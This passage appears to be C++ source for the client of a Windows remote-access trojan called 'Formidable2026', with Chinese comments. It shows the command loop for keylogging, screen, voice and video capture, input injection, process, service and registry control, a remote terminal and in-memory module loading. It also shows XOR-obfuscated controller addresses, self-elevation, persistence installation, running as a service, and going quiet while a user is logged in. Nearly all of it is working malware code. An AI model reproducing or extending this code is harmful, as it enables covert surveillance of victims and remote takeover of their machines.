            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        case CMD_TERMINAL_DATA: {
            char dbgMsg[256];
            sprintf_s(dbgMsg, "[FRMD26] CMD_TERMINAL_DATA: arg1=%u, dataLen=%d\n", pkg->arg1, pkg->arg1);
            OutputDebugStringA(dbgMsg);
            EnterCriticalSection(&g_TerminalMutex);
            if (g_pTerminalEntry) {
                OutputDebugStringA("[FRMD26] Calling terminal entry function for CMD_TERMINAL_DATA\n");
                g_pTerminalEntry(s, pkg);
            } else {
                OutputDebugStringA("[ERROR] g_pTerminalEntry is NULL!\n");
            }
            LeaveCriticalSection(&g_TerminalMutex);
            break;
        }
        case CMD_TERMINAL_CLOSE:
            EnterCriticalSection(&g_TerminalMutex);
            if (g_pTerminalEntry) {
                g_pTerminalEntry(s, pkg);
                if (g_hTerminalModule) {
                    MemoryFreeLibrary(g_hTerminalModule);
                    g_hTerminalModule = NULL;
                    g_pTerminalEntry = NULL;
                }
            }
            LeaveCriticalSection(&g_TerminalMutex);
            break;
        case CMD_LOAD_MODULE:
            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        case CMD_GET_SYSINFO:
        case CMD_FILE_LIST:
        case CMD_FILE_DOWNLOAD_DIR:
        case CMD_PROCESS_LIST:
        case CMD_PROCESS_KILL:
        case CMD_PROCESS_MODULES:
        case CMD_WINDOW_LIST:
        case CMD_WINDOW_CTRL:
        case CMD_SERVICE_LIST:
        case CMD_SERVICE_START:
        case CMD_SERVICE_STOP:
        case CMD_SERVICE_DELETE:
        case CMD_REGISTRY_CTRL: {
            char dbgMsg[256];
            sprintf_s(dbgMsg, "[FRMD26] Routing command %u: arg1=%u, arg2=%u\n", pkg->cmd, pkg->arg1, pkg->arg2);
            OutputDebugStringA(dbgMsg);
            uint32_t moduleKey = GetModuleKey(pkg->cmd);
            EnterCriticalSection(&g_ModuleMutex);
            auto it = g_ModuleEntryCache.find(moduleKey);
            if (it != g_ModuleEntryCache.end()) {
                LeaveCriticalSection(&g_ModuleMutex);
                OutputDebugStringA("[FRMD26] Module found in cache, calling entry function\n");
                it->second(s, pkg);
                break;
            }
            LeaveCriticalSection(&g_ModuleMutex);
            OutputDebugStringA("[ERROR] Module not found in cache! Loading from memory\n");
            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        }
        case CMD_SCREEN_CAPTURE:
        case CMD_VOICE_STREAM:
        case CMD_VIDEO_STREAM:
        case CMD_KEYLOG:
        case CMD_MOUSE_EVENT:
        case CMD_KEY_EVENT:
        case CMD_SCREEN_FPS:
        case CMD_SCREEN_QUALITY:
        case CMD_SCREEN_COMPRESS:
            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        case CMD_EXIT:
            ExitProcess(0);
            break;
    }
}

// 检测是否存在活跃的用户会话
bool IsUserSessionActive() {
    WTS_SESSION_INFOW* pSessions = NULL;
    DWORD count = 0;
    if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &count)) {
        for (DWORD i = 0; i < count; i++) {
            // 排除 Session 0 (Services) 并检查状态是否为 Active
            if (pSessions[i].SessionId != 0 && pSessions[i].State == WTSActive) {
                // 进一步检查该会话是否有用户登录
                // 如果是登录界面(WinLogon)，通常没有关联的用户名
                LPWSTR ppBuffer = NULL;
                DWORD bytes = 0;
                bool hasUser = false;
                
                if (WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, pSessions[i].SessionId, WTSUserName, &ppBuffer, &bytes)) {
                    if (ppBuffer && wcslen(ppBuffer) > 0) {
                        hasUser = true;
                    }
                    WTSFreeMemory(ppBuffer);
                }

                if (hasUser) {
                    WTSFreeMemory(pSessions);
                    return true;
                }
            }
        }
        WTSFreeMemory(pSessions);
    }
    
    return false;
}

struct ConnectionContext {
    SOCKET s;
    std::string serverIp;
    std::string serverPort;
    std::atomic<bool>* bConnected;
    std::atomic<bool>* bShouldExit;
};

void HandleConnection(ConnectionContext* ctx) {
    char dbgMsg[256];
    sprintf_s(dbgMsg, "[FRMD26] 已连接到 %s:%s\n", ctx->serverIp.c_str(), ctx->serverPort.c_str());
    OutputDebugStringA(dbgMsg);
    
    ctx->bConnected->store(true);
    
    ClientInfo info;
    GetClientInfo(info);
    SendPkg(ctx->s, &info, sizeof(ClientInfo));
    
    std::thread heartbeatThread([ctx]() {
        while (!ctx->bShouldExit->load() && ctx->bConnected->load()) {
            // 如果是服务进程，检测是否有活跃的用户会话
            if (g_IsService && IsUserSessionActive()) {
                OutputDebugStringA("[FRMD26] Active user session detected. Service entering standby (disconnecting).\n");
                ctx->bShouldExit->store(true);
                closesocket(ctx->s);
                break;
            }

            Sleep(30000);
            if (!ctx->bConnected->load() || ctx->bShouldExit->load()) break;
            
            ClientInfo hbInfo;
            GetClientInfo(hbInfo);
            
            size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
            std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
            PkgHeader* h = (PkgHeader*)hbBuf.data();
            memcpy(h->flag, "FRMD26?", 7);
            h->originLen = (int)hbBodySize;
            h->totalLen = (int)hbBuf.size();
            
            CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
            p->cmd = CMD_HEARTBEAT;
            p->arg1 = sizeof(ClientInfo);
            p->arg2 = 0;
            memcpy(p->data, &hbInfo, sizeof(ClientInfo));
            
            if (send(ctx->s, hbBuf.data(), (int)hbBuf.size(), 0) <= 0) {
                break;
            }
        }
    });
    
    while (!ctx->bShouldExit->load()) {
        PkgHeader header;
        int n = recv(ctx->s, (char*)&header, sizeof(PkgHeader), 0);
        if (n <= 0) break;
        
        if (memcmp(header.flag, "FRMD26?", 7) != 0) break;
        
        std::vector<char> body(header.originLen);
        int total = 0;
        while (total < header.originLen) {
            int r = recv(ctx->s, body.data() + total, header.originLen - total, 0);
            if (r <= 0) break;
            total += r;
        }
        
        if (total == header.originLen) {
            HandleCommand(ctx->s, (CommandPkg*)body.data(), header.originLen);
        } else {
            break;
        }
    }
    
    ctx->bConnected->store(false);
    if (heartbeatThread.joinable()) {
        heartbeatThread.join();
    }
}

void ClientMain() {
    srand((unsigned int)time(NULL));
    
    // 初始化多端控制互斥锁
    InitializeCriticalSection(&g_ModuleMutex);
    InitializeCriticalSection(&g_TerminalMutex);
    InitializeCriticalSection(&g_MultimediaMutex);
    
    // 调试：显示原始配置
    char dbgInit[512];
    sprintf_s(dbgInit, "[FRMD26] 启动配置: IP='%s', Port='%s', bEncrypt=%d, Flag='%s'\n",
        g_ServerConfig.szServerIP, g_ServerConfig.szPort, g_ServerConfig.bEncrypt, g_ServerConfig.szFlag);
    OutputDebugStringA(dbgInit);
    
    // 如果IP被加密，需要解密 (兼容 Formidable Pro 的异或逻辑)
    if (g_ServerConfig.bEncrypt == 1) {
        for (size_t i = 0; i < sizeof(g_ServerConfig.szServerIP) && g_ServerConfig.szServerIP[i]; i++) {
            g_ServerConfig.szServerIP[i] ^= 0x5A;
        }
        sprintf_s(dbgInit, "[FRMD26] 解密后IP: '%s'\n", g_ServerConfig.szServerIP);
        OutputDebugStringA(dbgInit);
    }
    
    // 尝试提权运行
    if (g_ServerConfig.runasAdmin == 1) {
        if (!IsAdmin()) {
             if (SelfElevate()) {
                 // 如果提权成功（启动了新进程），则当前进程退出
                 return;
             }
        }
    }

    InstallClient(); // 执行安装/自启动
    ProcessPayload(); // 执行载荷逻辑

    // 互斥体防止重复运行 (处理随机上线逻辑)
    if (g_ServerConfig.iMultiOpen == 0) {
        // 使用会话级别互斥体，避免跨会话问题
        std::string mutName = "FRMD26_" + std::string(g_ServerConfig.szServerIP);
        HANDLE hMutex = CreateMutexA(NULL, TRUE, mutName.c_str());
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            OutputDebugStringA("[FRMD26] 检测到互斥体，进程退出\n");
            if (hMutex) CloseHandle(hMutex);
            return;
        }
        // 不关闭互斥体句柄，保持进程生命周期
    }
    
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    // 解析 IP 列表
    std::vector<std::string> ipList;
    std::string ips = g_ServerConfig.szServerIP;
    size_t start = 0, end = 0;
    while ((end = ips.find(';', start)) != std::string::npos) {
        std::string s = ips.substr(start, end - start);
        if(!s.empty()) ipList.push_back(s);
        start = end + 1;
    }
    if (start < ips.length()) ipList.push_back(ips.substr(start));

    // 并发上线优化：如果配置了多个IP，随机打乱顺序
    if (g_ServerConfig.runningType == 0 && ipList.size() > 1) { // 随机上线模式
        for (size_t i = 0; i < ipList.size(); i++) {
            size_t j = rand() % ipList.size();
            std::swap(ipList[i], ipList[j]);
        }
    }

    if (g_ServerConfig.runningType == 1) { // 并发上线模式
        sprintf_s(dbgInit, "[FRMD26] 启动并发上线模式，连接 %zu 个主控端\n", ipList.size());
        OutputDebugStringA(dbgInit);
        
        std::vector<std::thread> connectionThreads;
        std::vector<std::unique_ptr<ConnectionContext>> contexts;
        std::vector<std::unique_ptr<std::atomic<bool>>> bConnected;
        std::vector<std::unique_ptr<std::atomic<bool>>> bShouldExit;
        
        for (size_t i = 0; i < ipList.size(); i++) {
            const std::string& serverIp = ipList[i];
            if (serverIp.empty()) continue;
            
            bConnected.push_back(std::make_unique<std::atomic<bool>>(false));
            bShouldExit.push_back(std::make_unique<std::atomic<bool>>(false));
            contexts.push_back(std::make_unique<ConnectionContext>());
            
            contexts.back()->bConnected = bConnected.back().get();
            contexts.back()->bShouldExit = bShouldExit.back().get();
            contexts.back()->serverIp = serverIp;
            contexts.back()->serverPort = g_ServerConfig.szPort;
            
            size_t threadIndex = i;
            connectionThreads.push_back(std::thread([threadIndex, &contexts, &ipList, &bConnected, &bShouldExit]() {
                int reconnectDelay = 5000;
                const int maxReconnectDelay = 300000;
                const int minReconnectDelay = 5000;
                int failedAttempts = 0;
                
                while (!bShouldExit[threadIndex]->load()) {
                    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (s == INVALID_SOCKET) {
                        Sleep(reconnectDelay);
                        continue;
                    }
                    
                    DWORD timeout = 15000;
                    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
                    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
                    
                    sockaddr_in addr = { 0 };
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons((unsigned short)atoi(contexts[threadIndex]->serverPort.c_str()));
                    addr.sin_addr.s_addr = inet_addr(contexts[threadIndex]->serverIp.c_str());
                    
                    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
                        reconnectDelay = minReconnectDelay;
                        failedAttempts = 0;
                        
                        ConnectionContext ctx;
                        ctx.s = s;
                        ctx.serverIp = contexts[threadIndex]->serverIp;
                        ctx.serverPort = contexts[threadIndex]->serverPort;
                        ctx.bConnected = bConnected[threadIndex].get();
                        ctx.bShouldExit = bShouldExit[threadIndex].get();
                        
                        HandleConnection(&ctx);
                        
                        closesocket(s);
                    } else {
                        failedAttempts++;
                        if (failedAttempts > 1) {
                            reconnectDelay = (reconnectDelay * 2 < maxReconnectDelay) ? reconnectDelay * 2 : maxReconnectDelay;
                        }
                        closesocket(s);
                    }
                    
                    Sleep(reconnectDelay);
                }
            }));
        }
        
        for (auto& t : connectionThreads) {
            if (t.joinable()) t.join();
        }
    } else { // 随机上线模式
        sprintf_s(dbgInit, "[FRMD26] 启动随机上线模式\n");
        OutputDebugStringA(dbgInit);
        
        int reconnectDelay = 5000;
        const int maxReconnectDelay = 300000;
        const int minReconnectDelay = 5000;
        int currentIpIndex = 0;
        int failedAttempts = 0;
        
        while (true) {
            // 如果是服务进程，检测是否有活跃的用户会话
            if (g_IsService && IsUserSessionActive()) {
                OutputDebugStringA("[FRMD26] Active user session detected. Service entering standby.\n");
                Sleep(5000);
                continue;
            }

            const std::string& serverIp = ipList[currentIpIndex % ipList.size()];
            if (serverIp.empty()) {
                currentIpIndex++;
                continue;
            }
            
            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) {
                Sleep(reconnectDelay);
                continue;
            }
            
            DWORD timeout = 15000;
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
            
            sockaddr_in addr = { 0 };
            addr.sin_family = AF_INET;
            addr.sin_port = htons((unsigned short)atoi(g_ServerConfig.szPort));
            addr.sin_addr.s_addr = inet_addr(serverIp.c_str());
            
            if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
                reconnectDelay = minReconnectDelay;
                failedAttempts = 0;
                
                std::atomic<bool> bConnected(false);
                std::atomic<bool> bShouldExit(false);
                
                ConnectionContext ctx;
                ctx.s = s;
                ctx.serverIp = serverIp;
                ctx.serverPort = g_ServerConfig.szPort;
                ctx.bConnected = &bConnected;
                ctx.bShouldExit = &bShouldExit;
                
                HandleConnection(&ctx);
                
                closesocket(s);
            } else {
                failedAttempts++;
                if (failedAttempts > 1) {
                    reconnectDelay = (reconnectDelay * 2 < maxReconnectDelay) ? reconnectDelay * 2 : maxReconnectDelay;
                }
                closesocket(s);
            }
            
            currentIpIndex++;
            if (currentIpIndex % ipList.size() == 0) {
                Sleep(reconnectDelay);
            } else {
                Sleep(1000);
            }
        }
    }
}
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            exit(0);
            break;
        default:
            break;
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_IsService = true;
    SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandlerW(L"Formidable2026", ServiceCtrlHandler);
    if (!hStatus) return;

    SERVICE_STATUS status = {0};
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(hStatus, &status);

    ClientMain(); // 服务模式下运行主循环
}

#ifndef _DEBUG
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        {(LPWSTR)L"Formidable2026", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
        // 如果不是以服务方式启动，则作为正常程序启动
        ClientMain();
    }
    return 0;
}
#else
// 如果是 Debug 模式且项目设置依然是 Windows 窗口应用
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ClientMain();
    return 0;
}
int main() {
    ClientMain();
    return 0;
}
#endif
